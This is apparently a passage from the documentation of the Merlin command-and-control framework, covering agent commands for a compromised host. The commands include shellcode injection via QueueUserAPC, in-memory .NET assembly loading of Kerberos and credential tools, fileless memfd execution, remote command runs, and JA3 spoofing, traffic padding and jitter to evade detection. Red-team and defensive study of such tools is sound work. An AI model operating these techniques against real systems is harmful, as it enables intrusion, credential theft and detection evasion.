<h3>UserAPC<a class="headerlink" href="#userapc" title="Permalink to this headline">¶</a></h3>
<p id="id4">The <code class="docutils literal notranslate"><span class="pre">userapc</span></code> method creates a thread in another process using the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> Windows API call.</p>
<p>Syntax is <code class="docutils literal notranslate"><span class="pre">execute-shellcode</span> <span class="pre">userapc</span> <span class="pre">&lt;PID&gt;</span> <span class="pre">&lt;SHELLCODE&gt;</span></code> where PID is the Process ID you want to execute the shellcode under.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This method is highly unstable and therefore was intentionally not added to the tab completion list of available methods. The current implementation requires the process to have more than 1 thread. All remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple instances of execution. This method frequently causes processes to crash. Additionally, the shellcode might not execute at all if none of the threads were in an alertable state. The <code class="docutils literal notranslate"><span class="pre">svchost.exe</span></code> process usually provides a little better choice, but still not guaranteed.</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin
[-]Created job NPQGRntaQX for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX
[+]Shellcode executed successfully
</pre></div>
</div>
</div>
</div>
<div class="section" id="info">
<h2>info<a class="headerlink" href="#info" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">info</span></code> command is used to get information about a specific agent.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info

+---------------------------+-----------------------------------------------+
| ID                        | c1090dbc-f2f7-4d90-a241-86e0c0217786          |
| Platform                  | windows                                       |
| Architecture              | amd64                                         |
| UserName                  | ACME\Dade                                     |
| User GUID                 | S-1-5-21-988272595-2747325887-1861723304-1002 |
| Hostname                  | WIN-7PD32                                     |
| Process ID                | 4120                                          |
| IP                        | [fe80::8893:b524:821:31ba/64                  |
|                           | 169.254.49.186/16                             |
|                           | 192.168.1.104/24 fe80::fd43:1a37:b31b:9788/64 |
| Initial Check In          | 2017-11-22 11:36:47.4171802 -0500 EST         |
|                           | m=+7.606503201                                |
| Last Check In             | 2017-11-22 12:26:50.1984432 -0500 EST         |
|                           | m=+3010.387766201                             |
| Agent Version             | 0.5.0 Beta                                    |
| Agent Build               | nonRelease                                    |
| Agent Wait Time           | 30s                                           |
| Agent Wait Time Skew      | 5                                             |
| Agent Message Padding Max | 4096                                          |
| Agent Max Retries         | 7                                             |
| Agent Kill Date           | 1970-01-01T00:00:00Z                          |
| Agent Failed Logins       | 0                                             |
+---------------------------+-----------------------------------------------+
</pre></div>
</div>
</div>
<div class="section" id="invoke-assembly">
<h2>invoke-assembly<a class="headerlink" href="#invoke-assembly" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">invoke-assembly</span></code> command will execute a .NET assembly that was previously loaded into the agent with the
<a class="reference internal" href="#load-assembly">load-assembly</a> command. The first argument is the name of the assembly and all the remaining arguments are passed to
the assembly for execution. Use the <a class="reference internal" href="#list-assemblies">list-assemblies</a> command return a list of loaded assemblies.
The <a class="reference internal" href="#execute-assembly">execute-assembly</a> command is different because it uses injection to run the assembly in a child process.
This command runs the assembly in the current process without injection.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly Rubeus.exe klist
[-] Created job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+]
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x37913
</pre></div>
</div>
</div>
<div class="section" id="jobs">
<h2>jobs<a class="headerlink" href="#jobs" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">jobs</span></code> command will display a table of all active jobs assigned to the agent. The output will not include jobs that have already completed.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs

      ID     | STATUS  |     TYPE     |       CREATED        |         SENT
+------------+---------+--------------+----------------------+----------------------+
  whFGRWHudV | Sent    | NativeCmd    | 2020-12-18T11:45:07Z | 2020-12-18T11:45:38Z
  UxegCkyROR | Sent    | AgentControl | 2020-12-18T11:45:11Z | 2020-12-18T11:45:38Z
  YqhfUvxkqZ | Created | CmdPayload   | 2020-12-18T11:45:44Z |
</pre></div>
</div>
</div>
<div class="section" id="kill">
<h2>kill<a class="headerlink" href="#kill" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">kill</span></code> control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -&gt; control -&gt; &lt;agent ID&gt; -&gt; kill. This is the shortest way to quickly kill an agent.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill
Merlin» [-]Created job goaRNhTVTT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
<div class="section" id="list-assemblies">
<h2>list-assemblies<a class="headerlink" href="#list-assemblies" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">list-assemblies</span></code> command lists .NET assemblies that have been loaded into the agent’s process with the <a class="reference internal" href="#load-assembly">load-assembly</a> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
[-] Created job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Loaded Assemblies:
seatbelt.exe
rubeus.exe
sharpdpapi.exe
sharpup.exe
Hagrid
</pre></div>
</div>
</div>
<div class="section" id="load-assembly">
<h2>load-assembly<a class="headerlink" href="#load-assembly" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">load-assembly</span></code> command loads a .NET assembly into the agent’s process. Once the assembly is loaded, it can be executed
multiple times with the <a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command. The .NET assembly is only sent across the wire one time.
An option third argument can be provided to reference the assembly as any other name when executed with the
<a class="reference internal" href="#invoke-assembly">invoke-assembly</a> command.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe
[-] Created job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] successfully loaded rubeus.exe into the default AppDomain
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe Hagrid
[-] Created job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] successfully loaded Hagrid into the default AppDomain
</pre></div>
</div>
</div>
<div class="section" id="ls">
<h2>ls<a class="headerlink" href="#ls" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">ls</span></code> command is used to list a directory’s contents using native Go functions within Merlin. This command will not execute the <code class="docutils literal notranslate"><span class="pre">ls</span></code> or <code class="docutils literal notranslate"><span class="pre">dir</span></code> binary programs found on their associated host operating systems. If a directory is not specified, Merlin will list the contents of the current working directory. When specifying a Windows path, you must escape the backslash (e.g.,. <cite>C:\Temp</cite>). Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without quotes by escaping the space (e.g.,. <code class="docutils literal notranslate"><span class="pre">/root/some\</span> <span class="pre">folder/</span></code>). Relative paths can be used (e.g.,. <code class="docutils literal notranslate"><span class="pre">./../</span></code> or <code class="docutils literal notranslate"><span class="pre">downloads\\Merlin</span></code>) and they are resolved to their absolute path.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls /var
[-]Created job eNJKIiLXXH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job eNJKIiLXXH
Directory listing for: /var

drwxr-xr-x      2019-02-06 00:05:17     4096    backups
drwxr-xr-x      2018-12-24 14:40:14     4096    cache
dgtrwxrwxrwx    2019-02-06 00:05:16     4096    crash
drwxr-xr-x      2019-01-17 21:24:30     4096    lib
dgrwxrwxr-x     2018-04-24 04:34:22     4096    local
Lrwxrwxrwx      2018-11-07 21:33:01     9       lock
drwxrwxr-x      2019-02-06 00:05:39     4096    log
dgrwxrwxr-x     2018-07-24 23:03:56     4096    mail
dgtrwxrwxrwx    2018-07-24 23:09:50     4096    metrics
drwxr-xr-x      2018-07-24 23:03:56     4096    opt
Lrwxrwxrwx      2018-11-07 21:33:01     4       run
drwxr-xr-x      2018-11-07 21:45:43     4096    snap
drwxr-xr-x      2018-11-07 21:38:04     4096    spool
dtrwxrwxrwx     2019-02-06 00:05:38     4096    tmp
</pre></div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls &quot;C:\\Program Files (x86)\\&quot;
[-]Created job ggQPFQhTrC for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job ggQPFQhTrC
Directory listing for: C:\Program Files (x86)

drwxrwxrwx      2018-09-15 00:42:33     0       Common Files
drwxrwxrwx      2018-09-15 02:08:27     0       Internet Explorer
drwxrwxrwx      2018-09-15 00:33:50     0       Microsoft.NET
drwxrwxrwx      2018-09-15 02:07:46     0       Windows Defender
drwxrwxrwx      2018-12-27 12:42:42     0       Windows Kits
drwxrwxrwx      2018-09-15 00:33:53     0       Windows Mail
drwxrwxrwx      2018-12-16 13:15:58     0       Windows Media Player
drwxrwxrwx      2018-09-15 02:10:06     0       Windows Multimedia Platform
drwxrwxrwx      2019-01-10 08:18:11     0       Windows Photo Viewer
drwxrwxrwx      2018-09-15 02:10:06     0       Windows Portable Devices
drwxrwxrwx      2018-09-15 00:33:50     0       Windows Sidebar
drwxrwxrwx      2018-09-15 00:33:50     0       WindowsPowerShell
-rw-rw-rw-      2018-09-15 00:31:34     174     desktop.ini
drwxrwxrwx      2018-09-15 00:42:33     0       windows nt
</pre></div>
</div>
</div>
<div class="section" id="main">
<h2>main<a class="headerlink" href="#main" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">main</span></code> command is used to leave the Agent menu and return back to the <a class="reference internal" href="main.html"><span class="doc">Main Menu</span></a>. It is an alias for the <code class="docutils literal notranslate"><span class="pre">back</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» main
Merlin»
</pre></div>
</div>
</div>
<div class="section" id="memfd">
<h2>memfd<a class="headerlink" href="#memfd" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">memfd</span></code> command loads a Linux executable file into memory (RAM) as an anonymous file using the
<a class="reference external" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">memfd_create</a> API call, executes it, and returns the
results.
The file is created with an empty string as its name.
Less the fact that RAM is a file on Linux, the executable is not written to disk.
View the <a class="reference external" href="https://www.sandflysecurity.com/blog/detecting-linux-memfd_create-fileless-malware-with-command-line-forensics/">Detecting Linux memfd_create() Fileless Malware with Command Line Forensics</a>
for detection guidance.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This command will not run on Windows agents</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd /tmp/hello.py
[-] Created job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Hello from a Python script
</pre></div>
</div>
</div>
<div class="section" id="nslookup">
<h2>nslookup<a class="headerlink" href="#nslookup" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">nslookup</span></code> command takes a space separated list of IP addresses or hostnames and performs a DNS query using the
host’s resolver and returns the results.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup 8.8.8.8 9.9.9.9 github.com google.com
[-] Created job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Query: 8.8.8.8, Result: dns.google.
Query: 9.9.9.9, Result: dns9.quad9.net.
Query: github.com, Result: 192.30.255.113
Query: google.com, Result: 142.250.73.238 2607:f8b0:4004:82a::200e
</pre></div>
</div>
</div>
<div class="section" id="pwd">
<h2>pwd<a class="headerlink" href="#pwd" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">pwd</span></code> command uses native Go to get and return the current working directory.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
[-]Created job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Current working directory: C:\Users\Joe
</pre></div>
</div>
</div>
<div class="section" id="quit">
<h2>quit<a class="headerlink" href="#quit" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">quit</span></code> command is used to exit out of the Merlin Server application. This is also an alias for the <code class="docutils literal notranslate"><span class="pre">exit</span></code> command.</p>
</div>
<div class="section" id="run">
<h2>run<a class="headerlink" href="#run" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">run</span></code> command is used to task the agent to run a program on the host and return STDOUT/STDERR. When issuing a command to an agent from
the server, the agent will execute the provided binary file for the program you specified and also pass along any
arguments you provide. It is important to note that program must be in the path. This allows an operator to specify and
use a shell (e.g.,. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly <em>WITHOUT</em> a shell.
For instance, <code class="docutils literal notranslate"><span class="pre">ping.exe</span></code> is typically in the host’s %PATH% variable on Windows and works <em>without</em> specifying <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.
However, the <code class="docutils literal notranslate"><span class="pre">ver</span></code> command is not an executable in the %PATH% and therefore <em>must</em> be run from <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.
Use the <a class="reference internal" href="#shell">shell</a> command if you want to use the operating system’s default shell directly.</p>
<p>Example using ping:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ping 8.8.8.8
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job DTBnkIfnus for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job DTBnkIfnus

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=23ms TTL=54
Reply from 8.8.8.8: bytes=32 time=368ms TTL=54
Reply from 8.8.8.8: bytes=32 time=26ms TTL=54
Reply from 8.8.8.8: bytes=32 time=171ms TTL=54

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 23ms, Maximum = 368ms, Average = 147ms
</pre></div>
</div>
<p>Example running <code class="docutils literal notranslate"><span class="pre">ver</span></code> <em>without</em> <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job iOMPERNYGT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job iOMPERNYGT
exec: &quot;ver&quot;: executable file not found in %PATH%
</pre></div>
</div>
<p>Example running <code class="docutils literal notranslate"><span class="pre">ver</span></code> <em>with</em> <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job IxVXgyIkhS

Microsoft Windows [Version 10.0.16299.64]
</pre></div>
</div>
<div class="section" id="shell-functions">
<h3>Shell Functions<a class="headerlink" href="#shell-functions" title="Permalink to this headline">¶</a></h3>
<p>Some commands and capabilities are components of a shell and can <em>ONLY</em> be used with a shell.
For example, the <code class="docutils literal notranslate"><span class="pre">dir</span></code> command is a component of <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> and is not its own program executable.
Therefore, <code class="docutils literal notranslate"><span class="pre">dir</span></code> can only be used within the <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> shell.
In order to use the <cite>dir</cite>, you must provide executable of the shell environment where that command resides.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir
</pre></div>
</div>
<p>The pipe and redirection characters <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , and <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> , are also functions of a shell environment.
If you want to use them, you must do so <em>WITH</em> a shell.
For Linux, an example would be:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»run bash -c &quot;cat /etc/passwd | grep root&quot;
</pre></div>
</div>
</div>
<div class="section" id="quoted-arguments">
<h3>Quoted Arguments<a class="headerlink" href="#quoted-arguments" title="Permalink to this headline">¶</a></h3>
<p>When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
<p>For example, this command will work fine because it does not have any special characters:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM
</pre></div>
</div>
<p>However, this command <strong>WILL</strong> fail because of the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol. The command will still execute, but will stop processing everything after the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM | fl
</pre></div>
</div>
<p>To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. Any inner quotes need to be escaped. The argument can be enclosed in double quotes or single quotes.
The command be executed in both of these ways:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &quot;Get-Service -Name win* -Exclude WinRM | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &quot;Get-Service -Name \&quot;win*\&quot; -Exclude &quot;WinRM&quot; | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &#39;Get-Service -Name \&#39;win*\&#39; -Exclude &#39;WinRM&#39; | fl&#39;
</pre></div>
</div>
</div>
<div class="section" id="escape-sequence">
<h3>Escape Sequence<a class="headerlink" href="#escape-sequence" title="Permalink to this headline">¶</a></h3>
<p>Following along with the Quoted Arguments section above, the <code class="docutils literal notranslate"><span class="pre">\</span></code> symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, <code class="docutils literal notranslate"><span class="pre">|</span></code> .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.</p>
<p>This command will fail because the <code class="docutils literal notranslate"><span class="pre">\</span></code> itself needs to escaped. Notice the error message shows <code class="docutils literal notranslate"><span class="pre">C:WindowsSystem32</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c C:\Windows\System32
[-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
[+]&#39;C:WindowsSystem32&#39; is not recognized as an internal or external command,
operable program or batch file.
[!]exit status 1
</pre></div>
</div>
<p>To correctly issue the command either escape the <code class="docutils literal notranslate"><span class="pre">\</span></code> or enclose the commands in quotes:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir C:\\Windows\\System32
</pre></div>
</div>
</div>
</div>
<div class="section" id="set">
<h2>set<a class="headerlink" href="#set" title="Permalink to this headline">¶</a></h2>
<p>The <code class="docutils literal notranslate"><span class="pre">set</span></code> command is used to provide the agent with instructions on controlling itself and/or its configuration. There are several control types to include:</p>
<ul class="simple">
<li><a class="reference internal" href="#ja3">ja3</a></li>
<li><a class="reference internal" href="#killdate">killdate</a></li>
<li><a class="reference internal" href="#maxretry">maxretry</a></li>
<li><a class="reference internal" href="#padding">padding</a></li>
<li><a class="reference internal" href="#skew">skew</a></li>
<li><a class="reference internal" href="#sleep">sleep</a></li>
</ul>
<div class="section" id="ja3">
<span id="id5"></span><h3>ja3<a class="headerlink" href="#ja3" title="Permalink to this headline">¶</a></h3>
<p><a class="reference external" href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">JA3 is a method for fingerprinting TLS clients on the wire</a>. Every TLS client has a unique signature depending on its configuration of the following TLS options: <code class="docutils literal notranslate"><span class="pre">SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats</span></code>.</p>
<p>The <code class="docutils literal notranslate"><span class="pre">ja3</span></code> option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). <a class="reference external" href="https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f">This</a> article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from <a class="reference external" href="https://ja3er.com/">https://ja3er.com/</a></p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The <code class="docutils literal notranslate"><span class="pre">-ja3</span></code> flag will override the the <code class="docutils literal notranslate"><span class="pre">-proto</span></code> flag and will cause the agent to use the protocol provided in the JA3 hash.</p>
</div>
<p>This example will create a TLS client with a JA3 hash of <code class="docutils literal notranslate"><span class="pre">51a7ad14509fd614c7bb3a50c4982b8c</span></code> that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2020-08-20T14:36:34Z
</pre></div>
</div>
</div>
<div class="section" id="killdate">
<span id="id6"></span><h3>killdate<a class="headerlink" href="#killdate" title="Permalink to this headline">¶</a></h3>
<p>Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.</p>
<p>Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.</p>
<p>The Killdate can also be set or changed for running agents using the <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">killdate</span></code> command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. <a class="reference external" href="http://unixtimestamp.50x.eu/">http://unixtimestamp.50x.eu/</a> can be used to generate a UNIX timestamp.</p>
<p>A UNIX timestamp of <cite>0</cite> will read like <cite>1970-01-01T00:00:00Z</cite> in the agent info table.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set killdate 811123200
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
<div class="section" id="maxretry">
<span id="id7"></span><h3>maxretry<a class="headerlink" href="#maxretry" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">maxretry</span></code> control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set maxretry 50
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
<div class="section" id="padding">
<span id="id8"></span><h3>padding<a class="headerlink" href="#padding" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">padding</span></code> control type is used to change the _maximum_ size of a message’s padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</div>
<div class="section" id="skew">
<span id="id9"></span><h3>skew<a class="headerlink" href="#skew" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">skew</span></code> command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set skew 5
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
</pre></div>
</div>
</div>
<div class="section" id="sleep">
<span id="id10"></span><h3>sleep<a class="headerlink" href="#sleep" title="Permalink to this headline">¶</a></h3>
